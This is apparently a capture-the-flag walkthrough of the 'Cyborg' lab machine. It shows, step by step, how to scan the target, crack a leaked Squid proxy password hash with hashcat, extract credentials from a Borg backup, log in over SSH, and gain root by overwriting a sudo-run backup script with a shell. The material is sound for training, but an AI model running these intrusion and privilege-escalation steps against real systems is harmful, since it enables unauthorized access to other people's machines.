# Enumeration

## \[+] 10.10.123.69 - cyborg.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.123.69 cyborg.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.123.69
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

After scanning, we will find ports 22 and 80 open.

## \[+] Port 80 - HTTP

### \[-] cyborg.thm

Nothing to really look at on this website at first glance, so let's try fuzzing for files and directories using [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt):

```sh
feroxbuster -u http://cyborg.thm -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-www-ferox.txt
```

After the scan is finished, we will find a couple of interesting URLs:

### \[-] cyborg.thm/admin/admin.html

Here, we will find a chat conversation between the website admins. One of the entries mentions an unsecure installation of [Squid Proxy](https://www.squid-cache.org/):

![9ed9f891846b541cf062373acb5bf45b.png](/resources/6b102cbce0704989853a85259c31989c.png)

[Today at 5.45am from Alex]
Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
I decided to give up like i always do ahahaha sorry about that.
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
```

# Initial Foothold

### \[-] cyborg.thm/etc/squid/passwd

Here, we'll find the credentials for the Squid Proxy. The password is hashed so we'll need to figure out which hashing algorithm was used before we can crack it:

![b4dd38a3346563d3c064050f895bc255.png](/resources/8c093d2bacc34083b756992878a1f9b3.png)

Copy the hash portion: `$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.` and paste it into a next text file then save it as `creds.txt`.

Using the [Haiti](https://noraj.github.io/haiti/#/pages/quick-start?id=quick-start) hash identifier tool will identify the hashing algorithm as MD5 and we can use mode 1600 with hashcat to crack it:

![a56f3ea6b5b2e64dd9da20028e5987ec.png](/resources/fc0c9ddd52254269844045799edafbc2.png)

Next, we'll run Hashcat using [this password list](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords.txt) from SecLists:

```sh
hashcat -m 1600 creds.txt /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords.txt
```

After some time, we will find the plaintext version of the password:

![2c64683e843cfa89202d656f9b37f027.png](/resources/8f1b885c9f174c40b52e50a77adc071f.png)

### \[-] cyborg.thm/admin/archive.tar

We'll start by uncompressing the archive by running the following command:

```sh
tar -xf archive.tar
```

This archive is a Borg Backup repository as mentioned in the `/home/field/dev/final_archive/README` file:

![308041fc5aeba89334f1ef422bb56bfd.png](/resources/ab393f687de0437389004259da7763bd.png)

Checking the Borg Backup [documentation](https://borgbackup.readthedocs.io/en/stable/quickstart.html), we will find the commands we will need to extract the data from the archive.

First, we'll need to move to the `/home/field/dev/` directory:

```sh
cd /home/field/dev/
```

Next, we'll run the following command to list the available archives and provide the password we cracked earlier when prompted:

```sh
borg list final_archive
```

![7b53f3e6447d6303cd70038f44e8fe4e.png](/resources/92cdee95366d4aa4bb63ea22f5b3e206.png)

We can extract all the files within the `music_archive` using the following command and provide the password when prompted:

```sh
borg extract final_archive::music_archive
```

Inside `/home/alex/Documents/note.txt` we will find a note and credentials:

![f69ae3e88ab68c502025888fb7875699.png](/resources/6cb8e8b759954de6879f28eb9661d5ea.png)

## \[+] Port 22 - SSH

### \[-] alex\@ubuntu

Let's use the credentials we just found to connect via SSH:

```sh
ssh alex@cyborg.thm
```

![2ea23e4e474838909474c5afb07065eb.png](/resources/54e6542fd61042e1b58246569b67ccfe.png)

We can find the user flag in `/home/alex/user.txt`:

![d1d598caaf2035435aa0593f8e66a815.png](/resources/655a1827453344b392e3cf34db5b458f.png)

# Privilege Esclation

### \[-] root\@ubuntu

The `.bash_history` log has not been cleared so let's see if we can find anything interesting:

![ee7c03e30f480a2d1157e8f60a3d7cca.png](/resources/473ad48a1ad84162b647dcd94f203945.png)

```sh
cat .bash_history
```

Here, we'll find a script being used with `sudo` to elevate the permissions inside the `/etc/mp3backups/` directory:

![f7a3de9eb1d9dfa38c4f47d14d4524a0.png](/resources/eb271dabf16348a187f63cd602b59bf1.png)

Let's check the sudo permissions of the user `alex` by running `sudo -l`:

![e46c3f1bd32c1d3b850dc89922944c0f.png](/resources/44677119cfa94a96af538a2b97c4e04c.png)

We still have sudo permissions for executing this script, so let's check our permissions on the script itself by running the following command:

```sh
ls -lah /etc/mp3backups/backup.sh
```

![9f10d3bcd09a679e94871d479109e55b.png](/resources/759f3f97a61f48a79efcd0825fede030.png)

Our current user, `alex` is the owner of the `backup.sh` script, which means we can edit the script however we want and run it with sudo permissions.

Let's make a backup copy of the script by running the following command:

```sh
cp backup.sh /tmp/backup.sh.old
```

Next, we'll need to turn on write permissions again by using `chmod +w`:

![4ac422dae3e8b0d6c00dd7f5a84fdf79.png](/resources/163e0d79c76b41dba9de0f741906cdad.png)

Then, we'll overwrite the script with our own commands which will create a bash shell and since it is being ran with the `sudo` command, we'll be root:

```sh
cat > backup.sh << EOF
#!/usr/bin/env bash
/bin/bash
EOF
```

![25f685753bfcf3ef95a476817ef8108d.png](/resources/d459a31f3000492986a6c33baf0783b8.png)

We can find the root flag in `/root/root.txt`:

```sh
cd /root
cat /root/root.txt
```

![8fd8287c84ff3c41d7c6fd6f3a2593d3.png](/resources/e5db46d06cc04a77a8993e7409a87a5d.png)
